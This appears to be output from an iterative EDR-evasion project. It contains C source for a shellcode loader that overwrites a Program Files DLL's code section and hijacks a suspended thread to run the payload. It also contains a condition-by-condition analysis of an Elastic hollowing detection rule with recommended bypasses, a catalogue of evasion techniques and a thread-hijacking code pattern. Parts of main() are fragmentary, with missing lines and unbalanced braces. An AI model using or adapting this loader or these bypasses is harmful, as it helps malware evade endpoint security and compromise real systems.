/*
 * Decoy stub — module-backed thread start routine. Lives in OUR image's
 * .text section, so CreateThread telemetry records a module-backed
 * StartAddress rather than the payload.
 */
static DWORD WINAPI DecoyStub(LPVOID lpParam)
{
    (void)lpParam;
    ExitThread(0);
    return 0; /* unreachable */
}

/* Resolve a symbol from a module handle; abort on failure. */
static FARPROC resolve(HMODULE mod, LPCSTR name, pGetProcAddress gpa)
{
    FARPROC p = gpa(mod, name);
    if (!p) {
        fprintf(stderr, "[-] GetProcAddress(%s) failed: %lu\n",
                name, GetLastError());
        ExitProcess(1);
    }
    return p;
}

/* Case-insensitive ASCII prefix test. */
static int starts_with_ci(const char* s, const char* prefix)
{
    if (!s || !prefix) return 0;
    while (*prefix) {
        char a = *s++;
        char b = *prefix++;
        if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
        if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
        if (a != b) return 0;
    }
    return 1;
}

/* Case-insensitive substring test (ASCII). */
static int contains_ci(const char* s, const char* needle)
{
    size_t nlen;
    if (!s || !needle) return 0;
    nlen = strlen(needle);
    if (nlen == 0) return 1;
    for (; *s; ++s) {
        size_t i;
        for (i = 0; i < nlen; ++i) {
            char a = s[i];
            char b = needle[i];
            if (a == 0) return 0;
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
            if (a != b) break;
        }
        if (i == nlen) return 1;
    }
    return 0;
}

/*
 * Return non-zero if the path is under C:\Windows\System32 or
 * C:\Windows\SysWOW64 — the exact condition-3 trigger of the hollowing rule.
 * We must NEVER stomp a donor in these directories.
 */
static int is_system32_path(const char* path)
{
    if (!path) return 0;
    if (starts_with_ci(path, "c:\\windows\\system32\\")) return 1;
    if (starts_with_ci(path, "c:\\windows\\syswow64\\")) return 1;
    /* Some hosts report via short path or with different casing. */
    if (contains_ci(path, "\\windows\\system32\\")) return 1;
    if (contains_ci(path, "\\windows\\syswow64\\")) return 1;
    return 0;
}

/* Return non-zero if path is under C:\Program Files or C:\Program Files (x86). */
static int is_program_files_path(const char* path)
{
    if (!path) return 0;
    if (starts_with_ci(path, "c:\\program files\\"))       return 1;
    if (starts_with_ci(path, "c:\\program files (x86)\\")) return 1;
    /* Fallback: match anywhere (handles \\?\ prefixes, etc.). */
    if (contains_ci(path, "\\program files\\"))            return 1;
    if (contains_ci(path, "\\program files (x86)\\"))      return 1;
    return 0;
}

/* Join a directory and a leaf name into dst (MAX_PATH cap). */
static int join_path(char* dst, size_t dstsz, const char* dir, const char* leaf)
{
    size_t dl = dir ? strlen(dir) : 0;
    size_t ll = leaf ? strlen(leaf) : 0;
    int need_sep;
    if (!dst || dstsz == 0 || !leaf) return 0;
    if (dl + ll + 2 > dstsz) return 0;
    need_sep = (dl > 0 && dir[dl - 1] != '\\' && dir[dl - 1] != '/');
    memcpy(dst, dir, dl);
    if (need_sep) dst[dl++] = '\\';
    memcpy(dst + dl, leaf, ll);
    dst[dl + ll] = '\0';
    return 1;
}

/*
 * Locate the executable .text (or first code) section of a mapped image.
 * Returns 1 on success and fills out_base/out_size.
 */
static int find_exec_section(BYTE* base, BYTE** out_base, SIZE_T* out_size)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS* nt;
    IMAGE_SECTION_HEADER* sec;
    IMAGE_SECTION_HEADER* fallback = NULL;
    BYTE* text_base = NULL;
    SIZE_T text_size = 0;
    WORD i;

    *out_base = NULL;
    *out_size = 0;

    dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        if (strncmp((const char*)sec->Name, ".text", 8) == 0) {
            text_base = base + sec->VirtualAddress;
            text_size = sec->Misc.VirtualSize;
            break;
        }
        if (!fallback && (sec->Characteristics & IMAGE_SCN_CNT_CODE)) {
            fallback = sec;
        }
    }
    if (!text_base && fallback) {
        text_base = base + fallback->VirtualAddress;
        text_size = fallback->Misc.VirtualSize;
    }
    if (!text_base || text_size == 0) return 0;

    *out_base = text_base;
    *out_size = text_size;
    return 1;
}

/*
 * Try to load a donor by full path, then verify:
 *   - its on-disk path is under C:\Program Files (or Program Files (x86))
 *   - its on-disk path is NOT under C:\Windows\System32 or SysWOW64
 *   - its .text section is >= 10000 bytes
 * Returns the module handle and fills the executable section bounds.
 */
static HMODULE try_donor(const char* path,
                         BYTE** out_text, SIZE_T* out_size)
{
    HMODULE h;
    char full[MAX_PATH];
    DWORD n;

    *out_text = NULL;
    *out_size = 0;

    h = dyn_LoadLibraryA(path);
    if (!h) return NULL;

    n = dyn_GetModuleFileNameA(h, full, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return NULL;

    /* Hard reject: System32/SysWOW64 is the exact condition-3 trigger. */
    if (is_system32_path(full)) {
        fprintf(stderr, "[!] rejecting System32 donor: %s\n", full);
        return NULL;
    }
    /* Require Program Files. */
    if (!is_program_files_path(full)) {
        fprintf(stderr, "[!] donor not under Program Files: %s\n", full);
        return NULL;
    }

    if (!find_exec_section((BYTE*)h, out_text, out_size)) {
        fprintf(stderr, "[!] donor has no usable .text: %s\n", full);
        return NULL;
    }
    if (*out_size < 10000) {
        fprintf(stderr, "[!] donor .text too small (%zu): %s\n",
                (size_t)*out_size, full);
        return NULL;
    }

    fprintf(stderr, "[+] donor selected: %s  (.text=%zu bytes)\n",
            full, (size_t)*out_size);
    return h;
}

/*
 * Enumerate a directory and try every *.dll inside it (recursively one level
 * is NOT performed — we only scan the given directory).  Returns the first
 * donor that passes try_donor(), or NULL.
 */
static HMODULE try_donor_dir(const char* dir, BYTE** out_text, SIZE_T* out_size)
{
    char pattern[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hf;
    HMODULE result = NULL;

    if (!join_path(pattern, sizeof(pattern), dir, "*.dll")) return NULL;

    hf = FindFirstFileA(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    do {
        char candidate[MAX_PATH];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!join_path(candidate, sizeof(candidate), dir, fd.cFileName)) continue;

        result = try_donor(candidate, out_text, out_size);
        if (result) break;
    } while (FindNextFileA(hf, &fd));

    FindClose(hf);
    return result;
}

/*
 * Enumerate C:\Program Files\dotnet\shared\Microsoft.NETCore.App\<ver>\
 * and try coreclr.dll in each version directory.  This replaces the
 * previously hardcoded "6.0.0" path so the loader works regardless of which
 * .NET runtime version(s) are installed.
 */
static HMODULE try_dotnet_coreclr(BYTE** out_text, SIZE_T* out_size)
{
    static const char* roots[] = {
        "C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App",
        "C:\\Program Files (x86)\\dotnet\\shared\\Microsoft.NETCore.App",
        NULL
    };
    int r;
    for (r = 0; roots[r]; ++r) {
        char pattern[MAX_PATH];
        WIN32_FIND_DATAA fd;
        HANDLE hf;
        HMODULE m = NULL;

        if (!join_path(pattern, sizeof(pattern), roots[r], "*")) continue;
        hf = FindFirstFileA(pattern, &fd);
        if (hf == INVALID_HANDLE_VALUE) continue;

        do {
            char ver_dir[MAX_PATH];
            char dll[MAX_PATH];
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (strcmp(fd.cFileName, ".") == 0) continue;
            if (strcmp(fd.cFileName, "..") == 0) continue;
            if (!join_path(ver_dir, sizeof(ver_dir), roots[r], fd.cFileName)) continue;
            if (!join_path(dll, sizeof(dll), ver_dir, "coreclr.dll")) continue;

            m = try_donor(dll, out_text, out_size);
            if (m) break;
        } while (FindNextFileA(hf, &fd));

        FindClose(hf);
        if (m) return m;
    }
    return NULL;
}

/*
 * Donor selection: try a small set of well-known Program Files DLLs first,
 * then fall back to directory enumeration for the .NET runtime (version-
 * independent) and Common Files subdirectories.
 */
static HMODULE select_donor(BYTE** out_text, SIZE_T* out_size)
{
    static const char* candidates[] = {
        /* Windows Media Player (present on most desktop SKUs). */
        "C:\\Program Files\\Windows Media Player\\wmp.dll",
        "C:\\Program Files (x86)\\Windows Media Player\\wmp.dll",
        "C:\\Program Files\\Windows Media Player\\wmpnetwork.dll",
        "C:\\Program Files (x86)\\Windows Media Player\\wmpnetwork.dll",
        /* Common Files (very widely present). */
        "C:\\Program Files\\Common Files\\microsoft shared\\ink\\TipBand.dll",
        "C:\\Program Files (x86)\\Common Files\\microsoft shared\\ink\\TipBand.dll",
        "C:\\Program Files\\Common Files\\System\\ado\\msado15.dll",
        "C:\\Program Files (x86)\\Common Files\\System\\ado\\msado15.dll",
        /* Internet Explorer / Edge legacy component in Program Files. */
        "C:\\Program Files\\Internet Explorer\\ieproxy.dll",
        "C:\\Program Files (x86)\\Internet Explorer\\ieproxy.dll",
        NULL
    };

    static const char* dirs[] = {
        "C:\\Program Files\\Common Files\\System\\ado",
        "C:\\Program Files (x86)\\Common Files\\System\\ado",
        "C:\\Program Files\\Common Files\\microsoft shared\\ink",
        "C:\\Program Files (x86)\\Common Files\\microsoft shared\\ink",
        NULL
    };

    int i;
    HMODULE h;

    for (i = 0; candidates[i] != NULL; ++i) {
        h = try_donor(candidates[i], out_text, out_size);
        if (h) return h;
    }

    /* Version-independent .NET runtime scan (replaces hardcoded 6.0.0). */
    h = try_dotnet_coreclr(out_text, out_size);
    if (h) return h;

    /* Enumerate well-known Common Files subdirectories. */
    for (i = 0; dirs[i] != NULL; ++i) {
        h = try_donor_dir(dirs[i], out_text, out_size);
        if (h) return h;
    }

    return NULL;
}

int main(int argc, char* argv[])

            fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n",

            return 1;
        }
        if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return 1; }

        fclose(fp);

            free(sc);
            return 1;

            BYTE* text_base = NULL;
            SIZE_T text_size = 0;

            DWORD oldProt = 0;
            DWORD tmp = 0;
            HANDLE th;
            CONTEXT ctx;

            if (!hDonor || !text_base || text_size == 0) {
                fprintf(stderr, "[-] no suitable Program Files donor found\n");
                SecureZeroMemory(sc, sc_size);
                free(sc);
                return 1;
            }
            if (sc_size > text_size) {
                fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                        (size_t)sc_size, (size_t)text_size);
                SecureZeroMemory(sc, sc_size);
                free(sc);
                return 1;
            }

            /* ---- 3. Overwrite donor .text with payload (RW -> memcpy -> RX) ---- */
            if (!dyn_VirtualProtect(text_base, text_size, PAGE_READWRITE, &oldProt)) {

                free(sc);
                return 1;

            memcpy(text_base, sc, sc_size);
            SecureZeroMemory(sc, sc_size);
            free(sc);

            if (!dyn_VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &tmp)) {
                fprintf(stderr, "[-] VirtualProtect(RX on donor .text) failed: %lu\n",
                        GetLastError());
                return 1;
            }

            /* ---- 4. thread_hijacking_local ----
             * Create a suspended thread whose start routine is a benign stub
             * inside our own image.  Its recorded StartAddress is
             * module-backed.  We then flip RIP to the stomped Program Files
             * donor's .text and resume.
             */
            th = dyn_CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)DecoyStub,
                                  NULL,
                                  CREATE_SUSPENDED,
                                  NULL);
            if (!th) {
                fprintf(stderr, "[-] CreateThread(suspended) failed: %lu\n",
                        GetLastError());
                return 1;
            }

            ZeroMemory(&ctx, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_CONTROL;
            if (!dyn_GetThreadContext(th, &ctx)) {
                fprintf(stderr, "[-] GetThreadContext failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            ctx.Rip = (DWORD64)(ULONG_PTR)text_base;

            if (!dyn_SetThreadContext(th, &ctx)) {
                fprintf(stderr, "[-] SetThreadContext failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            if (dyn_ResumeThread(th) == (DWORD)-1) {
                fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
                dyn_TerminateThread(th, 0);
                dyn_CloseHandle(th);
                return 1;
            }

            /* ---- 5. Wait for the payload thread to finish, then clean up. ---- */
            dyn_WaitForSingleObject(th, INFINITE);
            dyn_CloseHandle(th);
        }
    }

    return 0;
}

## Executive Summary

Iteration 3 attempted to escape the `Suspicious System Module Image Hollowing` rule by moving the donor DLL out of `C:\Windows\System32`/`SysWOW64` (the regex `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`). The exclusion is keyed on the *final user module of the call stack*, not on `target_address_path`. So swapping the donor directory was necessary but not sufficient.

  1. `process.Ext.api.name == "VirtualProtect"` and `process.Ext.api.behaviors == "hollow_image"` (i.e. the target page is *image-backed* — the loader stomped an existing mapped `.text`, not private memory).
  2. `process.Ext.api.parameters.size >= 10000` (large protection change).
  3. `process.Ext.api.metadata.target_address_path` matches `c:\windows\(system32|syswow64)\[a-z]+.dll` — **the stomped donor lives in System32/SysWOW64 and its name is all-lowercase letters followed by `.dll`**.
  4. `process.thread.Ext.call_stack_final_user_module` is a *known* module (name not `Undetermined`/`Unknown`/`Kernel`, summary not `*Unknown*`, `protection_provenance` not `Undetermined`/`Unbacked`/`Kernel*`).
  5. That final user module has **no trusted code signature** (`_arraysearch(... trusted == false or exists == false)` AND `not _arraysearch(... trusted == true)`).
  6. The call stack does **not** contain a LoadLibrary/GetProcAddress/LdrLoadDll/ExitProcess frame.
  7. The final user module's path is **not** in the allowlist: `nativeimages_*.dll`, `c:\program files\*`, `c:\program files (x86)\*`, `twain_32\*.dll`, `umppc*.dll`, `spool\drivers\*`.
  8. The final user module has a non-null SHA256 and is not in the known-good hash blocklist.

  The rule is a **conjunction of 8 conditions**. It only needs one to be false to stop firing.

- **Known_Exclusions** (from the rule text):
  - Path allowlist: `c:\windows\assembly\nativeimages_*.dll`, `c:\program files\*`, `c:\program files (x86)\*`, `c:\windows\twain_32\*.dll`, `c:\windows\system32\umppc*.dll`, `c:\windows\system32\spool\drivers\*`.
  - Name exclusion: `ntdll.dll*`, `kernel32.dll*`, `kernelbase.dll*` (covered by other rules).
  - Call-stack symbol exclusion: `kernelbase.dll!LoadLibrary*`, `kernel32.dll!ExitProcess*`, `kernelbase.dll!GetProcAddressForCaller*`, `ntdll.dll!LdrLoadDll*`.
  - Signature exclusion: any frame where `code_signature.trusted == true`.
  - Provenance exclusion: `Undetermined`, `Unbacked`, `Kernel*`.
  - Hash blocklist (known-good).

- **Gap_Detail**:
  Iter 3 correctly moved the donor out of System32, but the rule *still* fired. Two possibilities, and both are exploitable:

  1. **The exclusion at condition 7 is keyed on `call_stack_final_user_module.path`, not on `target_address_path`.** Iter 3 changed the *donor* path (which feeds `target_address_path`), but the rule's `C:\Program Files\*` exclusion checks the *final user module of the call stack* — a completely different field. Since the loader performs `VirtualProtect` from its own image (or from a frame that resolves to a module whose path is **not** under `Program Files`), the exclusion never matched. **The donor directory is irrelevant to the exclusion; only the call-stack's terminal module matters.**

  2. **Condition 3's regex is narrower than it looks**: `c:\windows\(system32|syswow64)\[a-z]+.dll` requires the filename to be **only lowercase ASCII letters** before `.dll`. A donor named e.g. `MSADO15.DLL` (uppercase), `msado15_2.dll` (digit/underscore), or a DLL in a *subdirectory* like `c:\windows\system32\spool\drivers\x64\...` would fail the regex. Note the allowlist itself already exploits this: `umppc*.dll` and `spool\drivers\*` are excluded because they'd otherwise match. **This means condition 3 is the *cheapest* condition to falsify — no need to touch the call stack at all.**

  There is also a third, structural gap: **condition 6 only excludes four specific symbol strings.** Any other legitimate frame (e.g. `kernelbase.dll!VirtualProtect`, `ntdll.dll!NtProtectVirtualMemory`, or a `LoadLibraryExW` variant) leaves the rule armed.

- **Bypass_Strategy** (same technique, minimal change — pick the lowest-cost falsification):

  **Option A — falsify condition 3 (target path regex).** Keep the current module-stomping + thread-hijack mechanics, but select the donor so that `target_address_path` **does not match** `c:\windows\(system32|syswow64)\[a-z]+.dll`. Concretely:
  - Prefer a donor whose filename contains a **digit, underscore, or uppercase letter** (e.g. `msado15.dll` already has digits — verify the actual path recorded by the sensor; if the sensor lowercases, instead pick a donor in a **subdirectory** such as `C:\Windows\System32\spool\drivers\x64\...` or `C:\Windows\System32\DriverStore\...`).
  - Or use a donor already covered by the allowlist's *spirit*: `C:\Windows\System32\umppc*.dll` or `C:\Windows\System32\spool\drivers\*` are explicitly excluded — but note these still match condition 3, they're excluded by condition 7. **The cleanest falsification is a donor whose recorded path simply fails the `[a-z]+\.dll` regex** (subdirectory, or non-alpha characters in the basename).
  - Iter 3's `C:\Program Files\...` donor was the right instinct but the wrong field. Re-target the *donor path* to a path that breaks the regex, not the allowlist.

  **Option B — falsify condition 7 via the call stack (the "real" gap).** Make `process.thread.Ext.call_stack_final_user_module.path` resolve to a `C:\Program Files\*` path. This requires the *terminal* frame of the call stack to be a module loaded from `Program Files`. Achievable by:
  - Performing the `VirtualProtect` call **from inside a function exported by a Program Files-resident signed DLL** (i.e. call through a pointer obtained via `GetProcAddress` from a DLL in `C:\Program Files\...`), so the top user frame is that DLL.
  - Or **proxy the `VirtualProtect` call through a gadget in such a DLL** (proxy_function_calls pattern), so the return address / caller frame resolves to the Program Files module.
  - This also satisfies condition 5's `trusted == true` exclusion if the Program Files DLL is signed — but note the rule's condition 5 is an AND of "no trusted sig" and "not any trusted sig", so a single trusted frame anywhere in `code_signature` array kills it. **This is the strongest gap: a signed call-stack frame alone neutralizes the rule.**

  **Option C — falsify condition 5 via signature presence.** If the final user module can be made to be a *signed* module (even a benign one, e.g. by routing the call through a signed DLL's exported function), `not _arraysearch(... trusted == true)` becomes false and the rule drops. This is the same mechanism as Option B but stated as the signature check.

  **Recommended next iteration:** combine **Option A (donor path that breaks the `[a-z]+\.dll` regex — e.g. a donor in `System32\spool\drivers\x64\` or a basename with digits/underscores)** with **Option B (route the `VirtualProtect` call through an exported function of a signed DLL under `C:\Program Files\*`)**. Either alone should falsify the conjunction; together they're belt-and-suspenders. Keep the existing thread-hijack execution path unchanged — the rule is about the *stomping* event, not the execution trigger.

  **Do not** attempt to satisfy the exclusion by changing `process.executable` (loader path) — that's out of scope per constraints.

### Memory Techniques
- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode. (bypasses: PAGE_EXECUTE_READWRITE memory permitted)
- **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions. (bypasses: RWX memory detected, PAGE_EXECUTE_READWRITE allocation)
- **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory. (bypasses: unbacked memory execution, private memory execution, process creation via shellcode)
- **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path. (bypasses: library_load events, unbacked/private memory in call stack, module list scans)
- **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts. (bypasses: thread creation detection, unbacked memory in call stack)
- **thread_hijacking_local** [USER-PREFERRED]: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory. (bypasses: thread creation call stack rules, CreateThread telemetry)
- **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created. (bypasses: CreateThread/CreateRemoteThread detection, remote injection rules)
- **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface. (bypasses: thread creation rules, call stack origin checks)
- **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR. (bypasses: VirtualAlloc/VirtualAllocEx detection)
- **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context. (bypasses: thread creation detection)
- **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion. (bypasses: module load detection, image section modification)
- **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory). (bypasses: Stack walking, ETW ThreadStart, GetThreadContext calls)
- **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name. (bypasses: image load detection, unsigned module loads)
- **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory. (bypasses: VirtualProtect events, unbacked memory in call stack, private memory execution)
- **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install. (bypasses: suspended process creation rules, cross-process alloc/write telemetry)
- **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique. (bypasses: userland hook detection, hooked NT API telemetry)
- **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry. (bypasses: hooked NT API telemetry, userland API interception)

Baseline to measure Elastic hollowing-rule coverage. (bypasses: suspended process creation, unmap events, cross-process writes)
- **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering. (bypasses: Direct syscall detection, RIP auditing)
- **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory. (bypasses: file-based detection, process creation monitoring)
- **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address. (bypasses: direct thread creation, CreateThread detection)

### thread_hijacking_local [USER-PREFERRED]
# Thread Hijacking (local process)

## Goal
Run payload code on an *existing* thread instead of creating a new one for execution. The thread's start address stays inside a legit module while we redirect RIP mid-flight.

## Pattern (self-process variant — no remote handles needed)
```c
// 1. Create a suspended worker thread — its start routine is a benign stub
//    inside our own image or a legit module
HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)decoy_stub,
                        NULL, CREATE_SUSPENDED, NULL);

// 2. Redirect its instruction pointer to the payload
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(t, &ctx);
ctx.Rip = (DWORD64)execAddr;   // e.g. address inside a stomped module
SetThreadContext(t, &ctx);

// 3. Resume — the thread "wakes up" already inside payload code
ResumeThread(t);
```

## Detection surface (Elastic)
- `SetThreadContext`/`GetThreadContext` on a suspended thread is a classic injection indicator — rules matching `process.Ext.api.name : "SetThreadContext"` may fire. Mitigate by calling it from inside a stomped module (call-stack hygiene) so the caller frame resolves to a legit DLL.
- Weaker than fiber execution on telemetry (Suspend/Get/SetContext leaves a visible API chain), but stronger than a plain `CreateThread(execAddr)` — the thread start address itself is never the payload.
- Prefer CREATE_SUSPENDED `CreateThread` over hijacking a busy existing thread: mid-flight context flips on a running thread race and crash.

## Pitfalls
- After payload returns, the thread has no sane return path — point it back at the decoy or terminate cleanly (`ExitThread` shim / stack pivot is fragile in pure C; document limitation).
- Keep the decoy stub inside our own `.text` or a stomped region — a decoy address in private memory defeats the purpose.
